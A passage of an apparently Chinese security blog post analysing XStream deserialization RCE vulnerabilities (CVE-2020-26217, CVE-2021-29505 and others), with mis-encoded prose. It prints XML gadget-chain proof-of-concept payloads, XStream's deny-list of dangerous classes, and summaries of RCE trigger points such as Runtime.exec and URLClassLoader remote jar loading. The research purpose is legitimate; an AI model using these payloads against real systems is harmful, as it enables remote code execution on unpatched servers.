class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é‡ç‚¹æ˜¯Wh1t3p1gå¸ˆå‚…BCELçš„ classLoaderçš„æ„é€ æ€è·¯åŠè¿‡ç¨‹ï¼Œå¯çœ‹å¸ˆå‚…åŸåšã€‚</p><h3 id="é»‘åå•ï¼š-7"><a href="#é»‘åå•ï¼š-7" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">      &lt;ctx&gt;</span><br><span class="line">        &lt;environment&#x2F;&gt;</span><br><span class="line">        &lt;registry class&#x3D;&quot;sun.rmi.registry.RegistryImpl_Stub&quot; serialization&#x3D;&quot;custom&quot;&gt;</span><br><span class="line">          &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">            &lt;string&gt;UnicastRef&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;string&gt;127.0.0.1&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;int&gt;1099&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;int&gt;0&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;short&gt;0&lt;&#x2F;short&gt;</span><br><span class="line">            &lt;boolean&gt;false&lt;&#x2F;boolean&gt;</span><br><span class="line">          &lt;&#x2F;java.rmi.server.RemoteObject&gt;</span><br><span class="line">        &lt;&#x2F;registry&gt;</span><br><span class="line">        &lt;host&gt;127.0.0.1&lt;&#x2F;host&gt;</span><br><span class="line">        &lt;port&gt;1099&lt;&#x2F;port&gt;</span><br><span class="line">      &lt;&#x2F;ctx&gt;</span><br><span class="line">      &lt;names&gt;</span><br><span class="line">        &lt;string&gt;aa&lt;&#x2F;string&gt;</span><br><span class="line">      &lt;&#x2F;names&gt;</span><br><span class="line">      &lt;nextName&gt;0&lt;&#x2F;nextName&gt;</span><br><span class="line">    &lt;&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration reference&#x3D;&quot;..&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure><h2 id="XStreamçš„é˜²å¾¡æªæ–½"><a href="#XStreamçš„é˜²å¾¡æªæ–½" class="headerlink" title="XStreamçš„é˜²å¾¡æªæ–½"></a>XStreamçš„é˜²å¾¡æªæ–½</h2><h3 id="é»‘åå•"><a href="#é»‘åå•" class="headerlink" title="é»‘åå•"></a>é»‘åå•</h3><p>åœ¨&gt;1.4.6ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼ŒXStreamå¼•å…¥äº†å®‰å…¨æœºåˆ¶ï¼Œä»¥é¿å…ååºåˆ—åŒ–é—®é¢˜ã€‚</p><p>Wh1t3p1gå¸ˆå‚…ã€Šå›é¡¾XStreamååºåˆ—åŒ–æ¼æ´ã€‹ä¸€æ–‡ä¸­0x03ä¸€èŠ‚ä¸­è§£é‡Šå¾—å¾ˆå¥½äº†ï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚è´´ä¸€ä¸‹å‚è€ƒã€2ã€‘ä¸­æåˆ°çš„æœ€æ–°ç‰ˆ1.4.16çš„é»‘åå•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANNOTATION_MAPPER_TYPE = <span class="string">&quot;com.thoughtworks.xstream.mapper.AnnotationMapper&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern PRIVILEGED_GETTER = Pattern.compile(<span class="string">&quot;.*\\$PrivilegedGetter&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAXWS_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$ServiceNameIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile(<span class="string">&quot;javafx\\.collections\\.ObservableList\\$.*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAX_CRYPTO = Pattern.compile(<span class="string">&quot;javax\\.crypto\\..*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupSecurity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.securityMapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="keyword">this</span>.denyTypes(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>, <span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>, <span class="string">&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;</span>, <span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>, <span class="string">&quot;sun.swing.SwingLazyValue&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypesByRegExp(<span class="keyword">new</span> Pattern[]&#123;LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchy(InputStream.class);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;java.nio.channels.Channel&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="keyword">this</span>.securityInitialized = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªæ­¤ï¼ŒæŠŠåŸºäºjdkçš„ç°æœ‰å·²çŸ¥é“¾éƒ½blockæ‰äº†ã€‚ç¬¬ä¸‰æ–¹çš„é“¾ï¼ˆå¦‚Groovyï¼‰è¿˜åœ¨å­˜æ´»ä¸­ï¼Œä¹‹åçš„å‘å±•è¶‹åŠ¿ï¼Œä¸çŸ¥é“ä¼šä¸ä¼šç±»ä¼¼fastjson/jacksonä¹‹ç±»çš„ï¼Œå¼€å§‹æ¼«é•¿çš„blockä¸‰æ–¹é“¾ã€‚</p><h3 id="ç™½åå•"><a href="#ç™½åå•" class="headerlink" title="ç™½åå•"></a>ç™½åå•</h3><p>XStreamåœ¨1.4.10ç‰ˆæœ¬å¢åŠ äº†setupDefaultSecurityæ–¹å¼æ¥è®¾ç½®é»˜è®¤çš„ç™½åå•ï¼Œä»…é»˜è®¤æ”¯æŒåŸºç¡€ç±»çš„å®ä¾‹åŒ–ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚å¤ç°äº†1.4.6ä¹‹åçš„å‡ ä¸ªPOCï¼Œä¸»è¦æ˜¯è·Ÿè¸ªRCEæ¼æ´è§¦å‘ç‚¹ï¼Œè‡³äºé“¾æ˜¯å¦‚ä½•æ„é€ çš„æœ¬èŠ‚æœªåšç ”ç©¶ï¼Œè¿™ä¸ªä½œä¸ºä¸‹èŠ‚çš„å†…å®¹é‡ç‚¹ç ”ç©¶ç ”ç©¶ã€‚</p><p>è¿‡ç¨‹ä¸­é—ç•™äº†1ä¸ªç°åœ¨è§£å†³ä¸äº†çš„é—®é¢˜ï¼ŒCVE-2021-21347 8u60ä¸‹çš„URLClassLoaderæ„é€ å­˜åœ¨é—®é¢˜ï¼Œæœªè§£å†³ï¼Œå¦‚æœæœ‰å¤§ä½¬é‡åˆ°å¹¶è§£å†³ï¼Œæ±‚åˆ†äº«ï¼Œä¸èƒœæ„Ÿæ¿€ã€‚</p><h4 id="æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹"><a href="#æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹" class="headerlink" title="æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹"></a>æ€»ç»“ä¸‹XStreamçš„ååºåˆ—åŒ–ç‰¹ç‚¹</h4><ol><li><p>åœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œå¯å®ä¾‹åŒ–çš„ç±»å¿…é¡»æ˜¯Serializableçš„ï¼Œä½†æ˜¯XStreamä¸å—é™åˆ¶æ‰€æœ‰ç±»éƒ½å¯ä»¥å®ä¾‹åŒ–ï¼Œè¿™ç‚¹å’Œfastjson/jacksonä¹‹ç±»çš„ä¸€æ ·ã€‚</p></li><li><p>fastjson/jacksonå®ç°ç±»å±æ€§èµ‹å€¼ï¼Œéƒ½æ˜¯é€šè¿‡getsettr/setsettræ¥å®ç°çš„ï¼ˆåªæ˜¯æœ‰äº›è°ƒç”¨æ¡ä»¶ä¸åŒï¼‰ï¼ŒXStreamæ˜¯é€šè¿‡Conveterçš„é€»è¾‘æ¥å®ç°ï¼ˆSerializableConveterä¹Ÿæ”¯æŒJavaåŸç”Ÿååºåˆ—åŒ–readObjectï¼‰ã€‚</p><ul><li>ä¸ºä»€ä¹ˆfastjson/jackson å­˜åœ¨jdkååºåˆ—åŒ–é“¾æ²¡æœ‰XStreamçš„å¤šï¼Ÿå› ä¸ºå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½ä¸¥æ ¼å®ç°äº†get/setï¼Œå¯¼è‡´å¾ˆå¤šjdkç±»ä¸èƒ½å®Œå…¨è¿˜åŸã€‚</li></ul></li><li><p>XStreamçš„æŸäº›Conveteræ˜¯å­˜åœ¨é—®é¢˜çš„</p><ul><li>MapConverter/TreeSetConveter/TreeMapConveteréƒ½ä¼šè§¦å‘è¿™äº›é›†åˆ/è¡¨ å†…å…ƒç´ çš„å†…éƒ¨å‡½æ•°ï¼Œæ¯”å¦‚compareã€hashcodeã€equalè¿™äº›å‡½æ•°ã€‚</li><li>DynamicProxyConverter ä»£ç†ç±»ï¼ŒInvocationHandlerå¯æ§ï¼Œå¯¼è‡´ä¸€äº›invokeå­˜åœ¨RCEé£é™©çš„InvocationHandlerç±»ï¼Œå¦‚EventHandlerï¼Œå¯ä»¥åŠ ä»¥åˆ©ç”¨ã€‚</li></ul></li></ol><h4 id="æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹"><a href="#æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹" class="headerlink" title="æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹"></a>æ€»ç»“ä¸‹RCEè§¦å‘ç‚¹</h4><ol><li>invoke å®ç°ä¸Šæœ‰é—®é¢˜çš„ InvokeHandlerï¼Œå¦‚<ul><li>EventHandler</li><li>æ­é…MethodClosureçš„ConvertedClosure</li></ul></li><li>hashCodeã€compareã€equalå®ç°æœ‰é—®é¢˜çš„Map/Set/Queueï¼Œå¦‚<ul><li>Expandoï¼ŒhashCodeæ­é…MethodClosureå¯ä»¥RCE</li><li>CVE-2021-21345 ServerTableEntry verifyæ–¹æ³•å¯RCE</li></ul></li><li>å­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„classï¼ˆè¿™ä¸€ç±»æ™®éå­˜åœ¨ï¼‰<ul><li>CVE-2020-26217 ImageIO$ContainsFilterï¼Œfilteræ–¹æ³•å†…å¯æ§</li><li>CVE-2021-21344 Accessor$GetterSetterReflectionï¼Œgetæ–¹æ³•å¯æ§</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSomeæ–¹æ³•å†…invokeå¯æ§</li></ul></li><li>åˆ©ç”¨ClassLoaderå®ä¾‹åŒ–<ul><li>ServiceLoader$LazyIteratorï¼Œè°ƒç”¨ç‚¹ä¸ºClass.forName (name,initialize,loader) ï¼ŒæŒ‡å®šloaderä¸ºBCEL classLoaer</li><li>CVE-2021-21347ï¼Œè°ƒç”¨ç‚¹ä¸ºloader.loadClass(name).newInstance()ï¼Œåˆ©ç”¨java.net.URLClassLoaderåŠ è½½è¿œç¨‹jarç±»å¹¶å®ä¾‹åŒ–</li><li>CVE-2021-21350ï¼Œå’ŒLazyIteratorä¸€æ ·ï¼Œåˆ©ç”¨BCEL classLoader</li></ul></li></ol><h4 id="æ€»ç»“ä¸‹Bullet-ysomapæ¦‚å¿µ"><a href="#æ€»ç»“ä¸‹Bullet-ysomapæ¦‚å¿µ" class="headerlink" title="æ€»ç»“ä¸‹Bullet(ysomapæ¦‚å¿µ)"></a>æ€»ç»“ä¸‹Bullet(ysomapæ¦‚å¿µ)</h4><ol><li>ProcessBuilder.start() æ— å‚æ•°</li><li>Runtime.getRuntime().exec(cmd) æœ‰å‚</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) æ— å‚</li><li>MethodClosure.call() æ— å‚</li></ol><p>æœ‰å‚çš„caseæ¯”è¾ƒå°‘è§ï¼ŒGroovyConvertedClosureæ˜¯ä¸€ä¾‹</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ·±å…¥åˆ†æ</a></li><li>[3] <a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></li><li>[4] <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></li><li>[5] <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></li><li>[6] <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></li><li>[7] <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></li><li>[8] <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></li><li>[9] <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‰æ–‡å·²ç»è®²è¿‡XStreamçš„ååºåˆ—åŒ–ç‰¹æ€§åŠæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œä»¥åŠ&amp;lt;=1.4.6ç‰ˆæœ¬çš„å‡ ä¸ªgadgetï¼Œåœ¨æ­¤èƒŒæ™¯ä¸Šï¼Œæœ¬èŠ‚å‡†å¤‡å¤ç°æŠ«éœ²çš„å‡ ä¸ªRCE CVEï¼Œæ­£å‘åˆ†æä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;XStreamå›¢é˜Ÿå¾ˆæœ‰æ„æ€ï¼Œå®‰å…¨å…¬å‘Šä¼šæŠŠPOCä¹Ÿå…¬å¼€ï¼Œå…·ä½“å¯ä»¥çœ‹&lt;a href=&quot;https://x-stream.github.io/security.html%E3%80%82&quot;&gt;https://x-stream.github.io/security.htmlã€‚&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-26217&quot;&gt;&lt;a href=&quot;#CVE-2020-26217&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-26217&quot;&gt;&lt;/a&gt;CVE-2020-26217&lt;/h2&gt;&lt;p&gt;è¿™ä¸ªå…¶å®å°±æ˜¯Wh1t3p1gå¸ˆå‚…ä¸­æåˆ°çš„ç¬¬4ä¸ªImageIO gadgetï¼Œåœ¨marshalsec gadgets ImageIOä¸­ä¹Ÿæœ‰ï¼Œä¸‹é¢æ­£å‘è·Ÿè¸ªä¸‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;Wh1t3p1gå¸ˆå‚…çš„POC&quot;&gt;&lt;a href=&quot;#Wh1t3p1gå¸ˆå‚…çš„POC&quot; class=&quot;headerlink&quot; title=&quot;Wh1t3p1gå¸ˆå‚…çš„POC&quot;&gt;&lt;/a&gt;Wh1t3p1gå¸ˆå‚…çš„POC&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;flags&amp;gt;0&amp;lt;&amp;#x2F;flags&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;value class&amp;#x3D;&amp;quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;dataSource class&amp;#x3D;&amp;quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;is class&amp;#x3D;&amp;quot;javax.crypto.CipherInputStream&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;cipher class&amp;#x3D;&amp;quot;javax.crypto.NullCipher&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;initialized&amp;gt;false&amp;lt;&amp;#x2F;initialized&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;opmode&amp;gt;0&amp;lt;&amp;#x2F;opmode&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;serviceIterator class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;iter 